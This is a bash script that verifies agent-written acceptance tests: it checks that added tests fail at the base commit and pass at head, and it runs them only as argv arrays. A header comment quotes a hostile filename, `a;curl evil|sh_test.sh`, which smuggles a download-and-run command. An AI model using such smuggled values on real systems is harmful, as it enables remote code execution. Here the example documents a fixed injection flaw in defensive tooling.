#!/bin/bash
# bin/repro-gate.sh <base-sha> [repo-dir]
#
# Mechanize red-before-green. The build prompt already orders it — write the
# acceptance tests, run them, save the failing output — and red.txt is written
# by the same agent whose work it certifies. This proves it independently:
# take the NEW tests, run them against the code as it was BEFORE the change, and
# require them to fail there.
#
# A new test that passes at base proves nothing. It may be asserting behaviour
# that already existed, or asserting nothing at all. That is the single cheapest
# mechanical check for a vacuous test, and no LLM has to be trusted for it.
#
# NEVER BUILD A COMMAND STRING. Filenames come from a diff, the diff comes from
# a builder, and the builder is steered by client-authored ticket text — so a
# test file named `a;curl evil|sh_test.sh` is reachable, and this script runs as
# root. The runner is an argv ARRAY executed directly; there is no `bash -c`
# anywhere and no shell ever parses a path. (Found by review on 2026-08-24: the
# first version did exactly that and executed a marker from a committed
# filename. Same class as the poll-commands RCEs in #37/#38.)
#
# ONLY ADDED TEST FILES ARE BLOCKING EVIDENCE. A modified test may be a comment
# edit, a rename, or a coverage backfill on behaviour that already shipped —
# none of which should fail at base, and none of which deserve a terminal. They
# are reported for the reviewer instead.
#
# A SHELL FILE IS A TEST BY ITS BASENAME, NEVER BY ITS DIRECTORY, and each one
# is its own bash invocation. `tests/lib/scratch.sh` and `bin/lib/test-home-lib.sh`
# are libraries the tests source; classifying them as tests overlaid the library
# under test into the base worktree, and `bash lib.sh the-test.sh` ran only the
# library, which — being a sourced lib — exits 0. Two honest builds were told
# their tests proved nothing (BH-459, BH-583) before BH-608 fixed it. So:
# *-test.sh / *_test.sh / *test.sh only, nothing under fixtures/ or testdata/
# (per-file invocation would otherwise execute every committed fixture script),
# and one file per bash so the second test cannot become the first one's $1.
# The exit codes below are unchanged.
#
# A RED IS ONLY HONEST IF THE BASE RUN COULD HAVE SUCCEEDED. A suite whose
# dependencies are absent from the base worktree fails on imports for every
# test, feature or not; counting that as red would make this a rubber stamp.
# Dependencies are established per stack before any red is believed, and where
# they cannot be, the gate says so instead of claiming a red it did not earn.
#
# exit 0  red at base, green at head — the evidence holds
# exit 1  an ADDED test PASSED at base — it proves nothing, gate fails, files named
# exit 2  no added test files — no blocking evidence offered (record, do NOT block)
# exit 3  gate could not run honestly (no runner, deps unresolvable) — do NOT block
# exit 4  tests fail at HEAD — red proven, green not
set -uo pipefail
BASE="${1:?base sha}"
REPO="${2:-.}"
cd "$REPO" 2>/dev/null || { echo "GATE_UNAVAILABLE cannot enter $REPO"; exit 3; }
git rev-parse --verify "$BASE" >/dev/null 2>&1 || { echo "GATE_UNAVAILABLE base $BASE not resolvable"; exit 3; }
TIMEOUT="${REPRO_TIMEOUT_SECS:-600}"

# Bounded where possible, and honest where not. argv only — never a string.
if command -v timeout >/dev/null 2>&1; then
  TO() { timeout "$TIMEOUT" "$@"; }
else
  TO() { "$@"; }
  UNBOUNDED=1
fi

is_test_path() {
  case "$1" in
    *.sh)
      # BH-608: tests/lib/scratch.sh and bin/lib/test-home-lib.sh are LIBRARIES
      # the tests source. Directory and substring rules classified them as tests,
      # the overlay put the lib at "base", and bash ran the lib instead of the
      # test. Shell tests are named *-test.sh / *_test.sh / *test.sh; fixture
      # data under fixtures/ or testdata/ is never a test to execute.
      case "$1" in */fixtures/*|*/testdata/*) return 1 ;; esac
      case "${1##*/}" in *-test.sh|*_test.sh|*test.sh) return 0 ;; *) return 1 ;; esac ;;
  esac
  case "$1" in
    */test/*|*/tests/*|*/__tests__/*|*/spec/*|test/*|tests/*|spec/*) return 0 ;;
    *.test.*|*.spec.*|*_test.go|*_test.py|test_*.py|*Test.java|*Tests.cs) return 0 ;;
    *) return 1 ;;
  esac
}

# NUL-delimited: a test file at "tests/my suite.test.js" must not word-split.
ADDED=(); MODIFIED=()
while IFS= read -r -d '' f; do
  is_test_path "$f" && [ -f "$f" ] && ADDED+=("$f")
done < <(git diff -z --name-only --diff-filter=A "$BASE"...HEAD 2>/dev/null)
while IFS= read -r -d '' f; do
  is_test_path "$f" && [ -f "$f" ] && MODIFIED+=("$f")
done < <(git diff -z --name-only --diff-filter=M "$BASE"...HEAD 2>/dev/null)

# DECISION (finding 4, review 2026-08-24) — CHOSEN, not overlooked.
# Only pure-ADDED test files are blocking evidence. Modified tests are counted
# and reported but never terminal, because a comment edit, a rename, or a
# coverage backfill on already-shipped behaviour will legitimately PASS at base,
# and blocking those while a diff with no tests at all merely warned was
# backwards. The accepted cost: a genuinely vacuous test appended to an EXISTING
# file escapes this gate. That is the reviewer's to catch, and it is the right
# trade — the alternative failed honest builds, which is how a gate gets
# disabled rather than obeyed.
MODNOTE=""
[ "${#MODIFIED[@]}" -gt 0 ] && MODNOTE=" (${#MODIFIED[@]} modified test file(s) seen but not used as blocking evidence — a comment edit or coverage backfill is not expected to fail at base)"

if [ "${#ADDED[@]}" -eq 0 ]; then
  echo "NO_NEW_TESTS: the diff adds no new test files as evidence.${MODNOTE}"
  exit 2
fi

# RUNNER is an argv array. Nothing here is ever concatenated into a string.
RUNNER=()
SH_PER_FILE=""

# npm run SCRIPT -- args appends those args to the LAST command of a compound
# script (`a && b`, `a; b`, `a | b`). project-4 test:unit is
# `node --test <globs> && tsx --test <tsx files>`, so extra .ts files land on
# tsx without the strip-types loader and GREEN false-fails with
# `Top-level await not supported (cjs)` while `node --test` on the same files
# exits 0. Proven 2026-09-02 on TK-791 r3 (fail=4 vs harness-suite fail=0).
# When the script is compound, drive added files with the FIRST command's argv
# (node --test …) as a real argv array — flags from package.json, filenames
# from ADDED, never concatenated. Playwright e2e specs are skipped: they are
# not the unit runner's job and dumping them onto tsx is the same false fail.
_npm_script_compound() {
  local name="$1"
  python3 -c '
import json, sys
name = sys.argv[1]
s = json.load(sys.stdin).get("scripts", {}).get(name, "")
sys.exit(0 if isinstance(s, str) and any(c in s for c in ("&&", ";", "|")) else 1)
' "$name" < package.json 2>/dev/null
}

_runner_from_compound() {
  local name="$1"
  local node_files=() tsx_files=()
  local f which
  for f in "${ADDED[@]}"; do
    case "$f" in
      tests/e2e/*|e2e/*|*/e2e/*) continue ;;
      *.tsx) tsx_files+=("$f") ;;
      *.ts|*.mts|*.mjs|*.js|*.cjs) node_files+=("$f") ;;
    esac
  done
  local -a files=()
  if [ "${#node_files[@]}" -gt 0 ]; then
    which=first
    files=("${node_files[@]}")
  elif [ "${#tsx_files[@]}" -gt 0 ]; then
    which=last
    files=("${tsx_files[@]}")
  else
    RUNNER=(npm run "$name")
    return 0
  fi
  local -a cmd=()
  while IFS= read -r -d '' part; do
    [ -n "$part" ] && cmd+=("$part")
  done < <(python3 -c '
import json, os, shlex, sys
name, which = sys.argv[1], sys.argv[2]
s = json.load(sys.stdin).get("scripts", {}).get(name, "")
if not isinstance(s, str) or not s.strip():
    sys.exit(1)
if which == "last":
    chunk = s.split("&&")[-1]
else:
    chunk = s.split("&&")[0]
chunk = chunk.split("|")[0].split(";")[0].strip()
try:
    parts = shlex.split(chunk)
except ValueError:
    sys.exit(1)

def is_file_arg(p):
    if any(c in p for c in "*?[{"):
        return True
    base = os.path.basename(p)
    if ".test." in base or ".spec." in base:
        return True
    if base.endswith("_test.go") or base.endswith("_test.py"):
        return True
    if base.startswith("test_") and base.endswith(".py"):
        return True
    return False

argv = [p for p in parts if not is_file_arg(p)]
if not argv:
    sys.exit(1)
if argv[0] in ("node", "nodejs") and "--test" not in argv:
    argv.append("--test")
sys.stdout.buffer.write(b"\0".join(a.encode() for a in argv) + b"\0")
' "$name" "$which" < package.json 2>/dev/null) || true
  if [ "${#cmd[@]}" -eq 0 ]; then
    RUNNER=(npm run "$name")
    return 0
  fi
  RUNNER=("${cmd[@]}" "${files[@]}")
  return 0
}

build_runner() {
  local first="${ADDED[0]}"
  case "$first" in
    *.sh)  SH_PER_FILE=1; RUNNER=(bash); return 0 ;;
    *.py)  if command -v pytest >/dev/null 2>&1; then RUNNER=(pytest -q "${ADDED[@]}"); return 0; fi
           if python3 -c 'import pytest' 2>/dev/null; then RUNNER=(python3 -m pytest -q "${ADDED[@]}"); return 0; fi
           return 1 ;;
    *_test.go) command -v go >/dev/null 2>&1 && { RUNNER=(go test ./...); return 0; }; return 1 ;;
  esac
  if [ -f package.json ]; then
    if grep -q '"test:unit"' package.json 2>/dev/null; then
      if _npm_script_compound test:unit; then
        _runner_from_compound test:unit && return 0
      fi
      RUNNER=(npm run test:unit -- "${ADDED[@]}"); return 0
    elif grep -q '"test"' package.json 2>/dev/null; then
      if _npm_script_compound test; then
        _runner_from_compound test && return 0
      fi
      RUNNER=(npm test -- "${ADDED[@]}"); return 0
    fi
  fi
  return 1
}
# Listed on their own lines rather than nested in a $(printf …) — the nesting was
# harmless (a quoted message argument, never executed) but it matches the shape
# a reviewer greps for when auditing this file for command-building, and a guard
# that needs a paragraph of explanation to read as safe is worth rewriting.
build_runner || { echo "GATE_UNAVAILABLE no runner for these test files:"; printf '%s\n' "${ADDED[@]}"; exit 3; }

WT=$(mktemp -d) || { echo "GATE_UNAVAILABLE no temp dir"; exit 3; }
cleanup() { git worktree remove --force "$WT" >/dev/null 2>&1 || true; rm -rf "$WT" 2>/dev/null || true; }
trap cleanup EXIT

# Three-dot diffs above, so the worktree belongs at the MERGE BASE — a branch
# tip that moved since the cut would mix unrelated changes into "before".
BASE_SHA=$(git merge-base "$BASE" HEAD 2>/dev/null) || BASE_SHA=""
[ -n "$BASE_SHA" ] || BASE_SHA=$(git rev-parse "$BASE" 2>/dev/null)
git worktree add -q --detach "$WT" "$BASE_SHA" >/dev/null 2>&1 \
  || { echo "GATE_UNAVAILABLE could not create a base worktree at $BASE_SHA"; exit 3; }

# Per-stack dependency check. An unrecognised stack is UNKNOWN, and unknown is
# not ready — otherwise a Python or Go repo gets the vacuous red that the JS
# guard was written to prevent.
deps_ready() {
  case "${ADDED[0]}" in
    *.sh) return 0 ;;   # nothing to resolve
    *.py)
      if [ -f requirements.txt ] || [ -f pyproject.toml ] || [ -f setup.py ]; then
        for V in .venv venv; do
          [ -d "$V" ] && { ln -s "$(pwd)/$V" "$WT/$V" 2>/dev/null || true; return 0; }
        done
        # Site-packages may still be global; only trust that when the imports
        # the tests need are already importable from outside the tree.
        python3 -c 'import pytest' 2>/dev/null && return 0
        echo "GATE_UNAVAILABLE python dependency manifest present but no resolvable environment — a base run would fail on imports and prove nothing"
        return 1
      fi
      return 0 ;;
    *_test.go)
      [ -d vendor ] && { ln -s "$(pwd)/vendor" "$WT/vendor" 2>/dev/null || true; }
      return 0 ;;   # module cache is global and shared with the base worktree
  esac
  if [ -f package.json ]; then
    [ -d node_modules ] && ln -s "$(pwd)/node_modules" "$WT/node_modules" 2>/dev/null
    [ -e "$WT/node_modules" ] && return 0
    echo "GATE_UNAVAILABLE package.json present but no node_modules to link — a base run would fail on imports and prove nothing"
    return 1
  fi
  # DECISION (finding 5) — an unrecognised stack is UNKNOWN, and unknown is NOT
  # ready. Erring the other way is what made this gate a rubber stamp for every
  # non-JS repo: the base run failed on imports, the failure was counted as an
  # honest red, and the build sailed through with proof it never earned. A gate
  # that declines to judge is a nuisance; one that fakes a verdict is worse.
  echo "GATE_UNAVAILABLE unrecognised stack for ${ADDED[0]} — cannot establish that a base failure would mean the feature is missing"
  return 1
}
deps_ready || exit 3

# The NEW tests, at their new content, against the OLD code.
for f in "${ADDED[@]}"; do
  mkdir -p "$WT/$(dirname "$f")" 2>/dev/null
  cp "$f" "$WT/$f" 2>/dev/null || true
done

# Shell tests run ONE FILE PER bash INVOCATION. `bash a.sh b.sh` runs a.sh with
# b.sh as $1 — the second file never executes (BH-608). Still an argv array
# per file, never a string. Aggregate like the other stacks: the run is red if
# ANY file is red; 124/127 from any file mean the run could not be judged.
run_suite() {
  if [ -z "$SH_PER_FILE" ]; then TO "${RUNNER[@]}"; return $?; fi
  local f rc worst=0
  for f in "${ADDED[@]}"; do
    case "$f" in *.sh) ;; *) continue ;; esac
    echo "--- bash $f ---"
    TO bash "$f"; rc=$?
    echo "--- exit $rc: $f ---"
    if [ "$rc" -eq 124 ] || [ "$rc" -eq 127 ]; then return "$rc"; fi
    if [ "$rc" -ne 0 ] && [ "$worst" -eq 0 ]; then worst=$rc; fi
  done
  return "$worst"
}

BASE_OUT=$(cd "$WT" && run_suite 2>&1); BASE_RC=$?
# 127 is "the runner never launched" and 124 is "it hung". Neither is evidence
# that a test failed for want of the feature, and counting them as red would
# stamp every build on a box with an incomplete toolchain.
if [ "$BASE_RC" -eq 127 ] || [ "$BASE_RC" -eq 124 ]; then
  echo "GATE_UNAVAILABLE base run exit $BASE_RC (runner missing or hung) — not counted as red"
  printf '%s\n' "$BASE_OUT" | tail -10
  exit 3
fi
if [ "$BASE_RC" -eq 0 ]; then
  echo "GATE FAILED — these ADDED tests PASS against the code as it was before the change, so they prove nothing:"
  printf '%s\n' "${ADDED[@]}"
  echo "--- base run tail ---"
  printf '%s\n' "$BASE_OUT" | tail -20
  exit 1
fi
echo "RED at base: exit $BASE_RC over ${#ADDED[@]} added test file(s) — the tests fail without the change ✓${MODNOTE}"

HEAD_OUT=$(run_suite 2>&1); HEAD_RC=$?
if [ "$HEAD_RC" -eq 127 ] || [ "$HEAD_RC" -eq 124 ]; then
  echo "GATE_UNAVAILABLE head run exit $HEAD_RC (runner missing or hung) — reproduction unproven either way"
  exit 3
fi
if [ "$HEAD_RC" -ne 0 ]; then
  echo "GREEN check FAILED — the same tests do NOT pass on this branch (exit $HEAD_RC)"
  printf '%s\n' "$HEAD_OUT" | tail -20
  exit 4
fi
echo "GREEN at head: exit 0 ✓${UNBOUNDED:+ (run UNBOUNDED — no timeout binary on this host)}"
echo "VERDICT: reproduction proven — red before the change, green after."
exit 0
